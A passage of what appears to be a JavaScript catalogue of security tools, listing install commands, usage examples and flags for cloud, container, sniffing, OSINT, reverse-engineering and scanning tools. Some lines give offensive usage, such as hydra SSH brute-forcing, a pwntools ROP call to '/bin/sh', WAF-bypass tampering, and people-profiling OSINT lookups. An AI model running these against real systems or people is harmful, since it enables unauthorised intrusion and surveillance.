  {
    id: "cloudfox",
    name: "CloudFox",
    cat: "Cloud",
    kind: "local",
    desc: "Find exploitable attack paths in cloud infrastructure -- AWS and Azure permission and resource enumeration",
    install: "go install github.com/BishopFox/cloudfox@latest",
    usage: [
      "cloudfox aws --profile my-profile all-checks",
      "cloudfox aws permissions",
      "cloudfox aws instances -o csv",
      "cloudfox aws env-vars",
      "cloudfox aws iam-simulator --principal arn:aws:iam::123456789:user/dev",
    ],
    flags: [
      { flag: "aws", desc: "Target AWS environment" },
      { flag: "--profile", desc: "AWS profile to use" },
      { flag: "all-checks", desc: "Run all enumeration modules" },
      { flag: "permissions", desc: "Enumerate IAM permissions" },
      { flag: "instances", desc: "List EC2 instances with metadata" },
      { flag: "env-vars", desc: "Extract environment variables from Lambda/ECS" },
      { flag: "-o", desc: "Output format: table, csv, json" },
    ],
    links: "https://github.com/BishopFox/cloudfox",
  },

  {
    id: "steampipe",
    name: "Steampipe",
    cat: "Cloud",
    kind: "local",
    desc: "Query cloud infrastructure with SQL -- unified API for AWS, Azure, GCP, GitHub, and 100+ services",
    install: "sudo /bin/sh -c \"$(curl -fsSL https://steampipe.io/install/steampipe.sh)\"",
    usage: [
      "steampipe query \"select * from aws_s3_bucket\"",
      "steampipe query \"select * from aws_iam_user where mfa_enabled = false\"",
      "steampipe check aws_compliance.benchmark.cis_v150",
      "steampipe plugin install aws azure gcp",
      "steampipe dashboard",
    ],
    flags: [
      { flag: "query", desc: "Run a SQL query against cloud APIs" },
      { flag: "check", desc: "Run compliance benchmarks/controls" },
      { flag: "plugin install", desc: "Install a cloud provider plugin" },
      { flag: "dashboard", desc: "Launch the web dashboard UI" },
      { flag: "--output", desc: "Output format: table, csv, json, line" },
      { flag: "--search-path", desc: "Set schema search path" },
    ],
    links: "https://steampipe.io/",
  },

  {
    id: "trufflehog",
    name: "TruffleHog",
    cat: "Cloud",
    kind: "local",
    desc: "Find and verify leaked credentials in git repos, S3 buckets, filesystems, and more using 700+ detectors",
    install: "pip install trufflehog",
    usage: [
      "trufflehog git https://github.com/example/repo.git",
      "trufflehog filesystem /path/to/project/",
      "trufflehog github --org example-org",
      "trufflehog s3 --bucket my-bucket",
      "trufflehog git file:///path/to/local/repo --since-commit abc123",
    ],
    flags: [
      { flag: "git", desc: "Scan a git repository" },
      { flag: "filesystem", desc: "Scan a local filesystem path" },
      { flag: "github", desc: "Scan GitHub organization or user repos" },
      { flag: "s3", desc: "Scan an S3 bucket" },
      { flag: "--only-verified", desc: "Only report verified/active credentials" },
      { flag: "--since-commit", desc: "Start scanning from this commit" },
      { flag: "--json", desc: "Output in JSON format" },
    ],
    links: "https://github.com/trufflesecurity/trufflehog",
  },

  {
    id: "aws-vault",
    name: "aws-vault",
    cat: "Cloud",
    kind: "local",
    desc: "Securely store and access AWS credentials in development -- uses your OS keychain, never on disk",
    install: "sudo apt install -y aws-vault",
    usage: [
      "aws-vault add my-profile",
      "aws-vault exec my-profile -- aws s3 ls",
      "aws-vault login my-profile",
      "aws-vault exec my-profile -- env | grep AWS",
      "aws-vault list",
    ],
    flags: [
      { flag: "add", desc: "Store credentials for a profile in the vault" },
      { flag: "exec", desc: "Execute a command with temporary credentials" },
      { flag: "login", desc: "Open the AWS console in a browser" },
      { flag: "list", desc: "List stored profiles and sessions" },
      { flag: "--duration", desc: "Session duration (e.g. 1h, 12h)" },
      { flag: "--no-session", desc: "Use master credentials directly" },
    ],
    links: "https://github.com/99designs/aws-vault",
  },

  // ---------------------------------------------------------------------------
  //  Container
  // ---------------------------------------------------------------------------

  {
    id: "trivy",
    name: "Trivy",
    cat: "Container",
    kind: "local",
    desc: "Comprehensive vulnerability scanner for containers, filesystems, repos, and IaC -- supports OS packages and language deps",
    install: "sudo apt install -y trivy",
    usage: [
      "trivy image nginx:latest",
      "trivy image --severity HIGH,CRITICAL alpine:3.18",
      "trivy fs /path/to/project/",
      "trivy repo https://github.com/example/repo",
      "trivy config /path/to/terraform/",
    ],
    flags: [
      { flag: "image", desc: "Scan a container image" },
      { flag: "fs", desc: "Scan a local filesystem/project" },
      { flag: "repo", desc: "Scan a remote git repository" },
      { flag: "config", desc: "Scan IaC files (Terraform, Dockerfile, etc.)" },
      { flag: "--severity", desc: "Filter by severity: LOW, MEDIUM, HIGH, CRITICAL" },
      { flag: "--format", desc: "Output format: table, json, sarif, template" },
      { flag: "--output", desc: "Write results to a file" },
      { flag: "--ignore-unfixed", desc: "Only show vulnerabilities with a fix available" },
    ],
    links: "https://github.com/aquasecurity/trivy",
  },

  {
    id: "grype",
    name: "Grype",
    cat: "Container",
    kind: "local",
    desc: "Vulnerability scanner for container images and filesystems -- match installed packages against known CVEs",
    install: "curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin",
    usage: [
      "grype nginx:latest",
      "grype alpine:3.18 --only-fixed",
      "grype dir:/path/to/project/",
      "grype sbom:./sbom.json",
      "grype nginx:latest -o json > results.json",
    ],
    flags: [
      { flag: "image", desc: "Scan a container image (default target type)" },
      { flag: "dir:", desc: "Scan a local directory" },
      { flag: "sbom:", desc: "Scan from a Syft-generated SBOM" },
      { flag: "--only-fixed", desc: "Show only vulnerabilities with available fixes" },
      { flag: "--fail-on", desc: "Set severity threshold to exit with error" },
      { flag: "-o", desc: "Output format: table, json, cyclonedx, sarif" },
      { flag: "--add-cpes-if-none", desc: "Generate CPEs for packages without one" },
    ],
    links: "https://github.com/anchore/grype",
  },

  {
    id: "dive",
    name: "Dive",
    cat: "Container",
    kind: "local",
    desc: "Explore each layer of a Docker image to discover wasted space and reduce image size",
    install: "sudo apt install -y dive",
    usage: [
      "dive nginx:latest",
      "dive build -t my-image:latest .",
      "dive nginx:latest --ci",
      "dive nginx:latest --ci --lowestEfficiency 0.9",
      "CI=true dive nginx:latest",
    ],
    flags: [
      { flag: "image", desc: "Analyze an existing container image" },
      { flag: "build", desc: "Build an image and immediately analyze" },
      { flag: "--ci", desc: "Run in CI mode (non-interactive, exits with code)" },
      { flag: "--lowestEfficiency", desc: "Minimum efficiency score (0-1) for CI pass" },
      { flag: "--highestWastedBytes", desc: "Maximum wasted bytes for CI pass" },
      { flag: "--highestUserWastedPercent", desc: "Maximum user wasted percent for CI pass" },
    ],
    links: "https://github.com/wagoodman/dive",
  },

  {
    id: "hadolint",
    name: "Hadolint",
    cat: "Container",
    kind: "local",
    desc: "Dockerfile linter -- validate best practices and detect common mistakes using AST-based analysis",
    install: "sudo apt install -y hadolint",
    usage: [
      "hadolint Dockerfile",
      "hadolint --ignore DL3008 Dockerfile",
      "hadolint -f json Dockerfile",
      "hadolint --trusted-registry docker.io Dockerfile",
      "cat Dockerfile | hadolint -",
    ],
    flags: [
      { flag: "--ignore", desc: "Ignore a specific rule (e.g. DL3008)" },
      { flag: "-f", desc: "Output format: tty, json, checkstyle, codeclimate, sarif" },
      { flag: "--trusted-registry", desc: "Set a trusted registry for FROM validation" },
      { flag: "--failure-threshold", desc: "Exit with failure if severity >= threshold" },
      { flag: "--no-fail", desc: "Always exit with code 0" },
      { flag: "-t / --strict-labels", desc: "Enforce mandatory labels in images" },
    ],
    links: "https://github.com/hadolint/hadolint",
  },

  {
    id: "kube-hunter",
    name: "kube-hunter",
    cat: "Container",
    kind: "local",
    desc: "Hunt for security weaknesses in Kubernetes clusters -- active and passive vulnerability scanning",
    install: "pip install kube-hunter",
    usage: [
      "kube-hunter --remote 10.0.0.5",
      "kube-hunter --cidr 10.0.0.0/24",
      "kube-hunter --internal",
      "kube-hunter --pod",
      "kube-hunter --active --remote 10.0.0.5",
    ],
    flags: [
      { flag: "--remote", desc: "Scan a specific remote IP or hostname" },
      { flag: "--cidr", desc: "Scan an entire CIDR range" },
      { flag: "--internal", desc: "Scan the local network (from inside cluster)" },
      { flag: "--pod", desc: "Scan from within a Kubernetes pod" },
      { flag: "--active", desc: "Enable active hunting (may change cluster state)" },
      { flag: "--report", desc: "Output format: plain, json" },
      { flag: "--log", desc: "Log level: debug, info, warning" },
    ],
    links: "https://github.com/aquasecurity/kube-hunter",
  },

  {
    id: "kube-bench",
    name: "kube-bench",
    cat: "Container",
    kind: "local",
    desc: "Check Kubernetes cluster configuration against CIS Kubernetes Benchmark security recommendations",
    install: "go install github.com/aquasecurity/kube-bench@latest",
    usage: [
      "kube-bench run",
      "kube-bench run --targets master",
      "kube-bench run --targets node",
      "kube-bench run --check 1.1.1,1.1.2",
      "kube-bench run --json > results.json",
    ],
    flags: [
      { flag: "run", desc: "Run the CIS benchmark checks" },
      { flag: "--targets", desc: "Specify which node type: master, node, etcd, policies" },
      { flag: "--check", desc: "Run specific check IDs only" },
      { flag: "--json", desc: "Output results as JSON" },
      { flag: "--benchmark", desc: "Specify CIS benchmark version" },
      { flag: "--scored", desc: "Run only scored checks" },
      { flag: "--group", desc: "Run checks in a specific group" },
    ],
    links: "https://github.com/aquasecurity/kube-bench",
  },

  {
    id: "falco",
    name: "Falco",
    cat: "Container",
    kind: "local",
    desc: "Cloud-native runtime security tool -- detect anomalous activity in containers and Kubernetes clusters using system call monitoring",
    install: "curl -fsSL https://falco.org/script/install | sudo bash",
    usage: [
      "sudo falco",
      "sudo falco -r /etc/falco/falco_rules.yaml",
      "sudo falco -o json_output=true",
      "sudo falco -A",
      "sudo falco -r custom_rules.yaml -o file_output.enabled=true -o file_output.filename=/tmp/falco.log",
    ],
    flags: [
      { flag: "-r", desc: "Rules file to load" },
      { flag: "-o", desc: "Set configuration option (key=value)" },
      { flag: "-A", desc: "Monitor all events, not just alerts" },
      { flag: "-d", desc: "Run as daemon" },
      { flag: "-p", desc: "Print format for alerts" },
      { flag: "-L", desc: "Show the list of all rule names and exit" },
    ],
    links: "https://falco.org/",
  },

  {
    id: "kubeaudit",
    name: "kubeaudit",
    cat: "Container",
    kind: "local",
    desc: "Audit Kubernetes clusters and manifests for security best practices -- privilege escalation, capabilities, and more",
    install: "go install github.com/Shopify/kubeaudit@latest",
    usage: [
      "kubeaudit all",
      "kubeaudit all -f deployment.yaml",
      "kubeaudit privileged",
      "kubeaudit rootfs",
      "kubeaudit all --format json",
    ],
    flags: [
      { flag: "all", desc: "Run all auditors" },
      { flag: "-f", desc: "Audit a local manifest file instead of cluster" },
      { flag: "privileged", desc: "Audit for privileged containers" },
      { flag: "rootfs", desc: "Audit for writable root filesystems" },
      { flag: "capabilities", desc: "Audit container Linux capabilities" },
      { flag: "--format", desc: "Output format: logfmt, json" },
      { flag: "--minSeverity", desc: "Minimum severity to report: error, warning, info" },
    ],
    links: "https://github.com/Shopify/kubeaudit",
  },

  // ---------------------------------------------------------------------------
  //  Sniffing (expanded)
  // ---------------------------------------------------------------------------

  {
    id: "tshark",
    name: "tshark",
    cat: "Sniffing",
    kind: "local",
    desc: "Command-line version of Wireshark -- capture and analyze network traffic with display filters",
    install: "sudo apt install -y tshark",
    usage: [
      "tshark -i eth0",
      "tshark -i eth0 -f 'port 80' -w capture.pcap",
      "tshark -r capture.pcap -Y 'http.request'",
      "tshark -r capture.pcap -T fields -e ip.src -e http.host",
      "tshark -i eth0 -Y 'dns' -T json",
    ],
    flags: [
      { flag: "-i", desc: "Network interface to capture on" },
      { flag: "-f", desc: "Capture filter (BPF syntax)" },
      { flag: "-Y", desc: "Display filter (Wireshark syntax)" },
      { flag: "-w", desc: "Write captured packets to file" },
      { flag: "-r", desc: "Read packets from a pcap file" },
      { flag: "-T", desc: "Output format: text, fields, json, pdml" },
      { flag: "-e", desc: "Field to extract (with -T fields)" },
    ],
    links: "https://www.wireshark.org/docs/man-pages/tshark.html",
  },

  {
    id: "mitmproxy",
    name: "mitmproxy",
    cat: "Sniffing",
    kind: "local",
    desc: "Interactive TLS-capable intercepting HTTP proxy -- inspect, modify, and replay web traffic in real-time",
    install: "pipx install mitmproxy",
    usage: [
      "mitmproxy",
      "mitmproxy --mode transparent",
      "mitmdump -w traffic.flow",
      "mitmweb",
      "mitmdump -r traffic.flow --set flow_detail=3",
    ],
    flags: [
      { flag: "--mode", desc: "Proxy mode: regular, transparent, socks5, reverse" },
      { flag: "-p", desc: "Proxy port (default 8080)" },
      { flag: "-w", desc: "Write flows to a file" },
      { flag: "-r", desc: "Read flows from a file" },
      { flag: "-s", desc: "Load a Python script for flow manipulation" },
      { flag: "--ssl-insecure", desc: "Do not verify upstream TLS certificates" },
    ],
    links: "https://mitmproxy.org/",
  },

  // ---------------------------------------------------------------------------
  //  Anonymity (expanded)
  // ---------------------------------------------------------------------------

  {
    id: "torsocks",
    name: "torsocks",
    cat: "Anonymity",
    kind: "local",
    desc: "Route any application's traffic through the Tor network transparently using LD_PRELOAD",
    install: "sudo apt install -y torsocks",
    usage: [
      "torsocks curl https://check.torproject.org",
      "torsocks wget https://example.onion/page",
      "torsocks ssh user@example.onion",
      "torsocks nmap -sT -Pn example.onion",
      "source torsocks on",
    ],
    flags: [
      { flag: "on/off", desc: "Enable/disable torsocks shell-wide (via source)" },
      { flag: "-i", desc: "Isolate the circuit (new Tor identity)" },
      { flag: "-d", desc: "Enable debug output" },
      { flag: "-p", desc: "SOCKS port to use (default 9050)" },
      { flag: "-a", desc: "SOCKS address to use (default 127.0.0.1)" },
    ],
    links: "https://github.com/dgoulet/torsocks",
  },

  {
    id: "anonsurf",
    name: "Anonsurf",
    cat: "Anonymity",
    kind: "local",
    desc: "System-wide Tor tunnel that routes all traffic through the Tor network -- IP anonymization for all apps",
    install: "git clone https://github.com/Und3rf10w/kali-anonsurf.git && cd kali-anonsurf && sudo ./installer.sh",
    usage: [
      "sudo anonsurf start",
      "sudo anonsurf stop",
      "sudo anonsurf status",
      "sudo anonsurf change",
      "sudo anonsurf myip",
    ],
    flags: [
      { flag: "start", desc: "Start the anonymous surfing mode" },
      { flag: "stop", desc: "Stop and restore normal networking" },
      { flag: "status", desc: "Check if anonsurf is running" },
      { flag: "change", desc: "Restart Tor to get a new identity/IP" },
      { flag: "myip", desc: "Show your current external IP address" },
    ],
    links: "https://github.com/Und3rf10w/kali-anonsurf",
  },

  // ---------------------------------------------------------------------------
  //  OSINT (new category)
  // ---------------------------------------------------------------------------

  {
    id: "sherlock",
    name: "Sherlock",
    cat: "OSINT",
    kind: "local",
    desc: "Hunt usernames across 400+ social networks and websites to find accounts belonging to a target",
    install: "pip install sherlock-project",
    usage: [
      "sherlock username",
      "sherlock user1 user2 user3",
      "sherlock username --timeout 10",
      "sherlock username -o results.txt",
      "sherlock username --site twitter instagram github",
    ],
    flags: [
      { flag: "--timeout", desc: "Timeout per request in seconds (default 60)" },
      { flag: "-o", desc: "Output file for results" },
      { flag: "--site", desc: "Limit search to specific sites" },
      { flag: "--print-found", desc: "Only print sites where user was found" },
      { flag: "--csv", desc: "Output as CSV" },
      { flag: "--json", desc: "Output as JSON" },
    ],
    links: "https://github.com/sherlock-project/sherlock",
  },

  {
    id: "maigret",
    name: "Maigret",
    cat: "OSINT",
    kind: "local",
    desc: "Collect person's accounts from 2500+ sites by username -- advanced Sherlock fork with more features",
    install: "pipx install maigret",
    usage: [
      "maigret username",
      "maigret username --all-sites",
      "maigret username -a -HP",
      "maigret username --pdf report.pdf",
      "maigret user1 user2 -o results/",
    ],
    flags: [
      { flag: "--all-sites", desc: "Check all 2500+ sites (slower but thorough)" },
      { flag: "-a", desc: "Use all available methods including API lookups" },
      { flag: "-HP", desc: "Generate HTML and PDF reports" },
      { flag: "--pdf", desc: "Generate a PDF report" },
      { flag: "-o", desc: "Output directory" },
      { flag: "--timeout", desc: "Request timeout in seconds" },
    ],
    links: "https://github.com/soxoj/maigret",
  },

  {
    id: "maltego",
    name: "Maltego",
    cat: "OSINT",
    kind: "local",
    desc: "Visual link analysis tool for OSINT -- map relationships between people, domains, IPs, and organizations",
    install: "sudo apt install -y maltego",
    usage: [
      "maltego",
      "# GUI: New Graph -> drag entity -> run transforms",
      "# GUI: Domain -> All Transforms -> DNS, WHOIS, subdomains",
      "# GUI: Person -> Social Network transforms",
      "# GUI: Export graph as PDF, CSV, or image",
    ],
    flags: [
      { flag: "Transforms", desc: "Data gathering plugins that query APIs" },
      { flag: "Entities", desc: "Nodes in the graph (domain, IP, person, email)" },
      { flag: "Machines", desc: "Automated transform chains" },
      { flag: "Export", desc: "Save graph as PDF, CSV, or XLS" },
      { flag: "Import", desc: "Load entities from CSV" },
    ],
    links: "https://www.maltego.com/",
  },

  {
    id: "phoneinfoga",
    name: "PhoneInfoga",
    cat: "OSINT",
    kind: "local",
    desc: "Phone number OSINT tool -- scan phone numbers for carrier, location, social media, and reputation data",
    install: "go install github.com/sundowndev/phoneinfoga/v2/cmd/phoneinfoga@latest",
    usage: [
      "phoneinfoga scan -n +1234567890",
      "phoneinfoga scan -n '+1 234 567 890'",
      "phoneinfoga serve -p 8080",
      "phoneinfoga scan -n +1234567890 --scanner local,numverify",
      "phoneinfoga scan -n +1234567890 -o json",
    ],
    flags: [
      { flag: "scan", desc: "Scan a phone number" },
      { flag: "-n", desc: "Phone number to scan (E.164 format)" },
      { flag: "serve", desc: "Start the web interface" },
      { flag: "-p", desc: "Port for web interface (default 5000)" },
      { flag: "--scanner", desc: "Specific scanners to use" },
      { flag: "-o", desc: "Output format: human, json" },
    ],
    links: "https://github.com/sundowndev/phoneinfoga",
  },

  {
    id: "holehe",
    name: "holehe",
    cat: "OSINT",
    kind: "local",
    desc: "Check if an email is used on 120+ sites -- email to registered accounts OSINT without any API keys",
    install: "pip install holehe",
    usage: [
      "holehe test@example.com",
      "holehe test@example.com --only-used",
      "holehe test@example.com -NP",
      "holehe test@example.com --csv output.csv",
      "holehe test@example.com --timeout 15",
    ],
    flags: [
      { flag: "--only-used", desc: "Only show sites where email is registered" },
      { flag: "-NP", desc: "Do not print the banner" },
      { flag: "--csv", desc: "Export results to a CSV file" },
      { flag: "--timeout", desc: "Request timeout in seconds (default 10)" },
      { flag: "-T", desc: "Number of threads" },
    ],
    links: "https://github.com/megadose/holehe",
  },

  // ---------------------------------------------------------------------------
  //  Reverse Engineering (new category)
  // ---------------------------------------------------------------------------

  {
    id: "ghidra",
    name: "Ghidra",
    cat: "Reverse Engineering",
    kind: "local",
    desc: "NSA's open-source software reverse engineering suite -- disassembler, decompiler, and analysis tools",
    install: "sudo apt install -y ghidra",
    usage: [
      "ghidra",
      "ghidraRun",
      "# GUI: File -> Import binary -> auto-analyze -> view decompiled code",
      "analyzeHeadless /path/to/project MyProject -import binary -postScript script.py",
      "# GUI: Window -> Decompile -> Function Graph -> Cross References",
    ],
    flags: [
      { flag: "analyzeHeadless", desc: "Run analysis from command line (no GUI)" },
      { flag: "-import", desc: "Import a binary file into the project" },
      { flag: "-postScript", desc: "Run a script after analysis" },
      { flag: "-process", desc: "Process already-imported files" },
      { flag: "-overwrite", desc: "Overwrite existing analysis" },
    ],
    links: "https://ghidra-sre.org/",
  },

  {
    id: "radare2",
    name: "radare2",
    cat: "Reverse Engineering",
    kind: "local",
    desc: "Unix-like reverse engineering framework -- disassembler, debugger, hex editor, and forensics tool",
    install: "sudo apt install -y radare2",
    usage: [
      "r2 binary",
      "r2 -A binary",
      "r2 -d binary",
      "# In console: aaa (analyze all) -> afl (list functions) -> pdf (disassemble function)",
      "r2 -c 'aaa; afl; q' binary",
    ],
    flags: [
      { flag: "-A", desc: "Run 'aaa' analysis on load" },
      { flag: "-d", desc: "Debug mode" },
      { flag: "-c", desc: "Run commands and exit" },
      { flag: "-w", desc: "Open file in write mode" },
      { flag: "-q", desc: "Quiet mode" },
      { flag: "afl", desc: "List all analyzed functions" },
      { flag: "pdf", desc: "Print disassembly of current function" },
    ],
    links: "https://rada.re/",
  },

  {
    id: "gdb",
    name: "GDB + GEF",
    cat: "Reverse Engineering",
    kind: "local",
    desc: "GNU Debugger with GEF extension -- enhanced debugging for exploit development and reverse engineering",
    install: "sudo apt install -y gdb && bash -c \"$(curl -fsSL https://gef.blah.cat/sh)\"",
    usage: [
      "gdb ./binary",
      "gdb -q -ex 'run' ./binary",
      "# In GDB: break main -> run -> step -> info registers",
      "# GEF: checksec -> heap chunks -> vmmap -> pattern create 100",
      "gdb -q -ex 'set args AAAA' -ex 'run' ./binary",
    ],
    flags: [
      { flag: "-q", desc: "Quiet mode, suppress intro messages" },
      { flag: "-ex", desc: "Execute a GDB command on startup" },
      { flag: "checksec", desc: "GEF: check binary security features" },
      { flag: "vmmap", desc: "GEF: show virtual memory map" },
      { flag: "pattern create", desc: "GEF: create cyclic pattern for offset finding" },
      { flag: "heap", desc: "GEF: inspect heap structures" },
    ],
    links: "https://github.com/hugsy/gef",
  },

  {
    id: "pwntools",
    name: "pwntools",
    cat: "Reverse Engineering",
    kind: "local",
    desc: "CTF framework and exploit development library for Python -- easy process/network interaction and ROP chain building",
    install: "pip install pwntools",
    usage: [
      "python3 -c \"from pwn import *; p = process('./vuln'); p.sendline(b'A'*64); p.interactive()\"",
      "python3 -c \"from pwn import *; r = remote('host', 1337); r.recvuntil(b'>'); r.sendline(b'payload')\"",
      "python3 -c \"from pwn import *; elf = ELF('./binary'); print(hex(elf.symbols['main']))\"",
      "python3 -c \"from pwn import *; rop = ROP('./binary'); rop.call('system', [next(rop.search(b'/bin/sh'))])\"",
      "python3 -c \"from pwn import *; print(cyclic(100))\"",
    ],
    flags: [
      { flag: "process()", desc: "Interact with a local process" },
      { flag: "remote()", desc: "Connect to a remote service" },
      { flag: "ELF()", desc: "Parse ELF binary for symbols and gadgets" },
      { flag: "ROP()", desc: "Build ROP chains automatically" },
      { flag: "cyclic()", desc: "Generate cyclic patterns for overflow offset" },
      { flag: "shellcraft", desc: "Generate shellcode for various architectures" },
    ],
    links: "https://docs.pwntools.com/",
  },

  // ---------------------------------------------------------------------------
  //  Vulnerability Scanning (new category)
  // ---------------------------------------------------------------------------

  {
    id: "openvas",
    name: "OpenVAS",
    cat: "Vulnerability Scanning",
    kind: "local",
    desc: "Full-featured vulnerability scanner with NVT feed -- network vulnerability tests for thousands of known CVEs",
    install: "sudo apt install -y openvas",
    usage: [
      "sudo gvm-setup",
      "sudo gvm-start",
      "# Web UI at https://localhost:9392",
      "# Scans -> New Task -> target IP -> Full and fast scan",
      "gvm-cli --gmp-username admin --gmp-password pass socket --xml '<get_tasks/>'",
    ],
    flags: [
      { flag: "gvm-setup", desc: "Initial setup and NVT feed sync" },
      { flag: "gvm-start", desc: "Start the scanner services" },
      { flag: "gvm-check-setup", desc: "Verify installation health" },
      { flag: "Full and fast", desc: "Default scan config with all NVTs" },
      { flag: "Discovery", desc: "Host and service discovery scan" },
    ],
    links: "https://www.openvas.org/",
  },

  {
    id: "wpscan",
    name: "WPScan",
    cat: "Vulnerability Scanning",
    kind: "local",
    desc: "WordPress security scanner -- enumerate plugins, themes, users, and check for known vulnerabilities",
    install: "sudo apt install -y wpscan",
    usage: [
      "wpscan --url https://example.com",
      "wpscan --url https://example.com --enumerate p,t,u",
      "wpscan --url https://example.com --api-token YOUR_TOKEN",
      "wpscan --url https://example.com --enumerate vp --plugins-detection aggressive",
      "wpscan --url https://example.com -U users.txt -P passwords.txt",
    ],
    flags: [
      { flag: "--url", desc: "Target WordPress URL" },
      { flag: "--enumerate", desc: "Enumerate: p=plugins, t=themes, u=users, vp=vulnerable plugins" },
      { flag: "--api-token", desc: "WPVulnDB API token for vulnerability data" },
      { flag: "--plugins-detection", desc: "Detection mode: passive, aggressive, mixed" },
      { flag: "-U", desc: "Username list for brute-force" },
      { flag: "-P", desc: "Password list for brute-force" },
      { flag: "--stealthy", desc: "Use random user-agent and passive detection" },
    ],
    links: "https://wpscan.com/",
  },

  {
    id: "subjack",
    name: "Subjack",
    cat: "Vulnerability Scanning",
    kind: "local",
    desc: "Subdomain takeover detection tool -- identify dangling CNAME records pointing to unclaimed cloud services",
    install: "go install github.com/haccer/subjack@latest",
    usage: [
      "subjack -w subdomains.txt -t 100 -timeout 30",
      "subjack -w subdomains.txt -t 100 -ssl",
      "subjack -w subdomains.txt -c fingerprints.json -o results.txt",
      "subfinder -d example.com | subjack -t 50",
      "subjack -w subs.txt -a -m -ssl",
    ],
    flags: [
      { flag: "-w", desc: "Input file with subdomains" },
      { flag: "-t", desc: "Number of threads (default 10)" },
      { flag: "-timeout", desc: "Timeout in seconds" },
      { flag: "-ssl", desc: "Force HTTPS connections" },
      { flag: "-c", desc: "Custom fingerprints file" },
      { flag: "-o", desc: "Output file for vulnerable results" },
      { flag: "-a", desc: "Show all results, not just vulnerable" },
      { flag: "-m", desc: "Show only manual review results" },
    ],
    links: "https://github.com/haccer/subjack",
  },

  {
    id: "whatwaf-tool",
    name: "WhatWaf",
    cat: "Vulnerability Scanning",
    kind: "local",
    desc: "Detect and bypass web application firewalls by identifying the WAF product and finding tamper scripts",
    install: "pip install whatwaf",
    usage: [
      "whatwaf -u 'https://example.com/page?id=1'",
      "whatwaf -u 'https://example.com' --ra",
      "whatwaf -u 'https://example.com/page?id=1' --tamper all",
      "whatwaf -l urls.txt",
      "whatwaf -u 'https://example.com' -p 'q=FUZZ' --verbose",
    ],
    flags: [
      { flag: "-u", desc: "Target URL" },
      { flag: "-l", desc: "File containing list of URLs" },
      { flag: "--ra", desc: "Use random user-agent" },
      { flag: "--tamper", desc: "Tamper scripts to try (all, or specific names)" },
      { flag: "-p", desc: "POST data with FUZZ placeholder" },
      { flag: "--verbose", desc: "Verbose output" },
    ],
    links: "https://github.com/Ekultek/WhatWaf",
  },

  // ---------------------------------------------------------------------------
  //  Reporting / Misc (new category)
  // ---------------------------------------------------------------------------

  {
    id: "seclists",
    name: "SecLists",
    cat: "Wordlists",
    kind: "local",
    desc: "Collection of security assessment wordlists -- usernames, passwords, URLs, fuzzing payloads, and more",
    install: "sudo apt install -y seclists",
    usage: [
      "ls /usr/share/seclists/",
      "ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
      "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt 10.0.0.5 ssh",
      "gobuster dir -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt",
      "sqlmap -u 'http://example.com/page?id=1' --tamper=space2comment",
    ],
    flags: [
      { flag: "Discovery/", desc: "Web content, DNS, SNMP wordlists" },
      { flag: "Passwords/", desc: "Common password lists and leaked databases" },
      { flag: "Usernames/", desc: "Common username lists" },
      { flag: "Fuzzing/", desc: "Fuzzing payloads for various injection types" },
      { flag: "Payloads/", desc: "XSS, SQLi, command injection payloads" },
    ],
    links: "https://github.com/danielmiessler/SecLists",
  },

  {
    id: "cyberchef",
    name: "CyberChef",
    cat: "Encoding",
    kind: "local",
    desc: "The Cyber Swiss Army Knife -- web app for encoding, decoding, encryption, compression, and data analysis",
    install: "docker run -d -p 8000:8000 ghcr.io/gchq/cyberchef:latest",
    usage: [
      "# Web UI at http://localhost:8000",
      "# Drag operations: From Base64 -> Gunzip -> Beautify",
      "# Magic button: auto-detect encoding chain",
      "# Recipes: save and share complex transform chains",
      "# Use with: encoding, hashing, encryption, compression, parsing",
    ],
    flags: [
      { flag: "Magic", desc: "Auto-detect encoding and suggest transforms" },
      { flag: "Recipe", desc: "Chain of operations to apply in order" },
      { flag: "Bake", desc: "Execute the current recipe on input" },
      { flag: "Save Recipe", desc: "Export operation chain as JSON" },
      { flag: "Fork", desc: "Split input and process each piece independently" },
    ],
    links: "https://gchq.github.io/CyberChef/",
  },

  {
    id: "ngrok",
    name: "ngrok",
    cat: "Network",
    kind: "local",
    desc: "Expose local servers to the internet through secure tunnels -- useful for webhook testing and demo callbacks",
    install: "sudo snap install ngrok",
    usage: [
      "ngrok http 8080",
      "ngrok http https://localhost:8443",
      "ngrok tcp 22",
      "ngrok http 3000 --auth 'user:pass'",
      "ngrok http 8080 --domain your-domain.ngrok-free.app",
    ],
    flags: [
      { flag: "http", desc: "Create an HTTP tunnel" },
      { flag: "tcp", desc: "Create a TCP tunnel" },
      { flag: "--auth", desc: "HTTP basic auth for the tunnel endpoint" },
      { flag: "--domain", desc: "Use a custom or reserved domain" },
      { flag: "--region", desc: "Tunnel region: us, eu, ap, au, sa, jp, in" },
      { flag: "--inspect", desc: "Enable/disable request inspection" },
    ],
    links: "https://ngrok.com/",
  },

  {
    id: "enum4linux-ng",
    name: "enum4linux-ng",
    cat: "Recon",
    kind: "local",
    desc: "Next-gen SMB/NetBIOS enumeration tool -- users, shares, groups, policies, and OS info from Windows/Samba hosts",
    install: "pipx install enum4linux-ng",
    usage: [
      "enum4linux-ng -A 10.0.0.5",
      "enum4linux-ng -u user -p pass -A 10.0.0.5",
      "enum4linux-ng -U -S 10.0.0.5",
      "enum4linux-ng -oJ results.json 10.0.0.5",
      "enum4linux-ng -R 500-550 10.0.0.5",
    ],
    flags: [
      { flag: "-A", desc: "Run all enumeration modules" },
      { flag: "-u", desc: "Username for authentication" },
      { flag: "-p", desc: "Password for authentication" },
      { flag: "-U", desc: "Enumerate users" },
      { flag: "-S", desc: "Enumerate shares" },
      { flag: "-R", desc: "Enumerate users via RID cycling (range)" },
      { flag: "-oJ", desc: "Output as JSON" },
    ],
    links: "https://github.com/cddmp/enum4linux-ng",
  },

  {
    id: "smbclient",
    name: "smbclient",
    cat: "Recon",
    kind: "local",
    desc: "FTP-like client for accessing SMB/CIFS shares on Windows and Samba servers from the command line",
    install: "sudo apt install -y smbclient",
    usage: [
      "smbclient -L //10.0.0.5/ -N",
      "smbclient //10.0.0.5/share -U user%pass",
      "smbclient //10.0.0.5/share -N",
      "smbclient //10.0.0.5/share -U user%pass -c 'ls; get file.txt'",
      "smbclient //10.0.0.5/share -U user%pass -c 'recurse; prompt; mget *'",
    ],
    flags: [
      { flag: "-L", desc: "List available shares on a host" },
